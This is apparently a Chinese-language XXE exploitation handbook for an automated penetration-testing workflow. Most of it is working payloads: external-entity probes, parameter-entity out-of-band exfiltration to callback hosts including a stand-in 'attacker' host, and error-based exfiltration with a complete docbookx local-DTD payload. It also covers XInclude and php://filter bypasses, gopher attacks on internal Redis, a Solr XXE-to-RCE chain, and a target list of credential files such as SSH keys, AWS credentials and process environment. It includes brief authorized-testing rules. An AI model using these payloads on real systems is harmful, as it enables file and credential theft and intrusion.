---
id: xxe-full
title: XXE 手册（file 读/OOB/参数实体/文档内嵌）
tags: xxe,xml,实体,ooxml,svg,s4
---
# XXE 手册

> 前置：oob-interactsh（回连通道）。判据=回连或本地文件回显；**读取仅限公开示例文件做存在性证明，敏感文件只证可达不外带**。

## 一、基础探测（外部实体回连）

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://<oob回连>/xxe">]><r>&xxe;</r>
# Content-Type: application/xml 或表单值内嵌 XML 均测
# 有回显：<!ENTITY xxe SYSTEM "file:///etc/passwd">（公开示例文件，存在性证明）
```

## 二、无回显（参数实体 OOB 外带）

```xml
<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://<oob回连>/dtd">
%remote;]>
# 远端 dtd：<!ENTITY % f SYSTEM "file:///etc/hostname"><!ENTITY % s "<!ENTITY send SYSTEM 'http://<oob回连>/?d=%f;'>">%s;%send;
# 仅外带公开文件内容；JAR 内嵌场景改用本地 dtd（上传可控文件时）
```

## 三、文档内嵌面（高发、易漏）

| 场景 | 探针点 |
|---|---|
| OOXML（docx/xlsx/pptx） | 解包改 `[Content_Types].xml` / 各 `.rels` 注入实体 → 回连 |
| SVG 上传/头像 | `<svg><image href="http://<oob>"/></svg>`（SSRF）+ 内嵌 DOCTYPE（XXE） |
| PDF 生成 | HTML→PDF 渲染服务喂 `<iframe src=file://>`（判据：PDF 内文字出现=本地读） |
| SOAP/WSDL | 接口报错回显 XML 结构 → 直接注入 DOCTYPE |
| RSS/导入功能 | OPML/XML 导入位 |

## 四、变体与绕过（检测口径）

- 参数实体绕过 general entity 过滤；`CDATA` 内嵌、UTF-16 编码变换；XInclude（`<xi:include parse="text">`）当 DOCTYPE 被滤。
- PHP 伪协议：`php://filter/read=convert.base64-encode/resource=...`（有回显时）。
- Java 高版本（JAXP）默认禁外部实体但常被 re-enable；报错半截 XML 记入假设。

## 五、纪律

- 确证 → record_finding（cwe-611）+ 可读范围评估（仅列已证文件）；内网探活（借 XXE 做 SSRF 探测）走 ssrf-deep 联动登记。
- 利用级（写文件/NTLM relay 面）转 S5 审批。

## 本地 DTD 注入路径库与扩展场景

- **本地 DTD 复用**（无外网时）：引用目标机已有 DTD 重定义实体——Linux `/usr/share/yelp/dtd/docbookx.dtd`（重定义 ISOamso 实体）；Windows `C:\Windows\System32\wbem\xml\cim20.dtd`；JAR 内 `jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd`
- **XInclude**（DOCTYPE 被禁时）：`<xi:include href="file:///etc/passwd" parse="text"/>`（需 parse="text" 处理非 XML）
- **免反射 SSRF**：`<!DOCTYPE foo PUBLIC "-//a//DTD//EN" "http://attacker/notify">`（不需要回显实体）
- **场景**：SVG 上传、Office docx、SOAP；JSON 端点换 `Content-Type: application/xml` 试双格式解析器；gopher:// 实体打内网 Redis；`php://filter/convert.base64-encode` 包裹解决二进制回显
- **链式**：Solr CVE-2017-12629 XXE → 注册 VelocityResponseWriter → RCE

### 报错式外带与路径库补全

报错式 OOB（HTTP 外带被禁时）：`<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;` → 解析报错消息带出文件内容。docbookx 重定义完整实体：`<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;'>%local_dtd;]>`。本地 DTD 路径库补全：`/usr/share/xml/fontconfig/fonts.dtd`、`/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd`、`/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd`、`/usr/share/struts/struts-config_1_0.dtd`、`/opt/zaproxy/xml/alert.dtd`、Windows `wmi20.dtd`、JAR 内 wildfly/struts2 dtd。协议补：`ftp://atk:21/x` 探端口；Windows `file://HASH.atk.com` 触发 DNS/SMB 无需 HTTP。读取目标清单：`/proc/self/environ`（DB 凭据/key）、`~/.ssh/id_rsa`、`~/.aws/credentials`、`C:\inetpub\wwwroot\web.config`。SOAP 补测：SOAPAction 头与 WSDL import 端点。docx 重打包：unzip → document.xml 插 DOCTYPE → zip 回。